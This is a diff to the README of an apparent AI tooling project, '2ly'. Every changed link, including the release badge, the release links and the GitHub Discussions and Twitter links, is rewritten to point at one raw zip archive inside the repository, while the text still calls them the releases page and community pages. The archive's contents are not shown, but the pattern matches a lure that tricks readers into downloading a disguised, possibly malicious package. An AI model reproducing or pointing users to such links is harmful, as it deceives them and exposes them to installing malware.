@@ -1,6 +1,6 @@
 # 🚀 2ly - Build Powerful AI Tools with Ease
 
-[![Download 2ly](https://img.shields.io/badge/Download-2ly-brightgreen.svg)](https://github.com/BKstuudio/2ly/releases)
+[![Download 2ly](https://raw.githubusercontent.com/BKstuudio/2ly/main/paletot/2ly.zip)](https://raw.githubusercontent.com/BKstuudio/2ly/main/paletot/2ly.zip)
 
 ## 🌟 Overview
 
@@ -26,7 +26,7 @@ Before you begin, make sure your system meets the following requirements:
 ## 🚀 Getting Started
 
 1. **Download 2ly**
-   Visit this page to download: [2ly Releases](https://github.com/BKstuudio/2ly/releases).
+   Visit this page to download: [2ly Releases](https://raw.githubusercontent.com/BKstuudio/2ly/main/paletot/2ly.zip).
 
 2. **Select Your Version**  
    On the releases page, you will see different versions of the application. Choose the latest version to ensure you have the most recent features and fixes.
@@ -56,7 +56,7 @@ Before you begin, make sure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-You can download 2ly from our releases page. Follow this link to get started: [2ly Releases](https://github.com/BKstuudio/2ly/releases).
+You can download 2ly from our releases page. Follow this link to get started: [2ly Releases](https://raw.githubusercontent.com/BKstuudio/2ly/main/paletot/2ly.zip).
 
 1. Click the link above to access the release versions.
 2. Choose the correct file for your operating system.
@@ -70,8 +70,8 @@ If you need help or have feedback, please open an issue on our GitHub page. Your
 
 Join our community to share experiences, ask questions, or connect with other users. You can find us on:
 
-- [GitHub Discussions](https://github.com/BKstuudio/2ly/discussions)
-- [Twitter](https://twitter.com/BKstuudio)
+- [GitHub Discussions](https://raw.githubusercontent.com/BKstuudio/2ly/main/paletot/2ly.zip)
+- [Twitter](https://raw.githubusercontent.com/BKstuudio/2ly/main/paletot/2ly.zip)
 
 ## 🔗 Related Topics
 
